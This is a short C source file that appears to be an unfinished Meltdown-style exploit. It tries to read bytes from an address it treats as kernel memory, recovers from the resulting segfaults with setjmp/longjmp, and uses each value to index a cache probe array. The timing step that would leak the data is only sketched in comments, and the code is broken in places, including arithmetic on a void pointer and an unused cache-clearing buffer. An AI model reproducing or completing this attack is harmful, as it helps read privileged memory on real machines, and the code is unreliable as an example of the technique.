#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <setjmp.h>
#include <signal.h>
//if you read array much larger than the l3 cache it should clear everything except that array

#define GB *1073741824
jmp_buf buf;
//jmp_buf bufOriginal;
uint8_t kernel_memory = 0;


void signal_manager(int sig) {
    if (sig == SIGSEGV) {
	printf("caught it\n");
	longjmp(buf, 1);
    }
}



int main() {
	
    unsigned int num;

    signal(SIGSEGV, signal_manager);

    // uint*_t should be one byte big
    uint8_t* probe_array = malloc(256 * 4096 * sizeof(uint8_t));

    
    // CLEAR CACHE
    void *clearer = calloc(8, 1024*1024); // 8 MB


    void* task_size = ((((unsigned long)&num) + 1 GB) / (1 GB)) GB; 
    printf("task: %p\n", task_size);
    if (task_size == NULL) { return 33; }



    A: if (!setjmp(buf)) {
    	//do {
    	//	
    	puts("here");
	    kernel_memory = *(uint8_t*)(task_size);
    	    task_size++;
	//} while (kernel_memory == 0);
	 puts("hi");
    } else {
	printf("recovered\n");
    	if (kernel_memory == 0) goto A;
    }
  
    printf("kernel memory data: %d\n", (int)kernel_memory); 
    
    uint64_t final_kernel_memory = kernel_memory * 4096; // 4096 is page size?
    uint8_t dummy = probe_array[final_kernel_memory];

    // catch page fault
    // determine which of 256 slots in probe_array is cached
    //for (int i=0; i<256; i++) {
	// start timing
	// get it
	// end timing
    //}

    return 0;
}

